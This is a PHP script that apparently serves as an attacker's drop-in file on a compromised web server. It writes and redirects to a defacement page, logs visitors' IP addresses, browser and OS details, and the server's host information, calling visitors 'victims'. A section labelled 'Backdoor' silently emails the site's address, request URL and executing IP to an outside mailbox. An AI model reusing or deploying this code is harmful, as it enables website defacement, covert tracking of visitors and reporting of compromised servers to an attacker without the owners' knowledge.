<?php
 $fp=fopen('df.html','w'); // File pointer
 fwrite($fp, "<h1>GG bro...!</h1>"); // Write text into this file
 fclose($fp); // Close the file
?>

<?php
 // Redirect to x.html
 header("Location:df.html");
 // Create log folder
 if (!file_exists('Log')) {
     mkdir('log', 0777, true);
$file="log/logs.txt";
$f=fopen($file,'a'); // Opens the file logs.txt in append mode (add the contents at the end of file) and store the pointer in variable f. "a" try to open Logs.txt of not exist it will try to create it.
fwrite($f,"------------------------------"."\n"); //Write the string into the file.
fwrite($f,"IP Address:".$_SERVER['REMOTE_ADDR']."\n"); // ".$_SERVER['REMOTE_ADDR']" Is a build function ,returns IP address.
fwrite($f,"User Agent:".$_SERVER['HTTP_USER_AGENT']."\n"); // ".$_SERVER['HTTP_USER_AGENT']" Is a build function, returns the current user agent used by victim. It will contains information about the browser details(mozilla 3.6,ie), operating system(10,linux).
fwrite($f,"Host Name:".php_uname('n')."\n"); // Returns the host name.
fwrite($f,"Operating System:".php_uname('v')."(".php_uname('s').")"."\n"); //Returns the OS names information
fclose($f); // close the opened file.
}

// Backdoor
$time_shell = "".date("d/m/Y - H:i:s")."";
$ip_remote = $_SERVER["REMOTE_ADDR"];
$from_shellcode = 'Kdan@'.gethostbyname($_SERVER['SERVER_NAME']).'';
$to_email = 'xxx@gmail.com';
$server_mail = "".gethostbyname($_SERVER['SERVER_NAME'])."  - ".$_SERVER['HTTP_HOST']."";
$linkcr = "Link: ".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']." - IP Excuting: $ip_remote - Time: $time_shell";
$header = "From: $from_shellcode\r\nReply-to: $from_shellcode";
@mail($to_email, $server_mail, $linkcr, $header);
?>
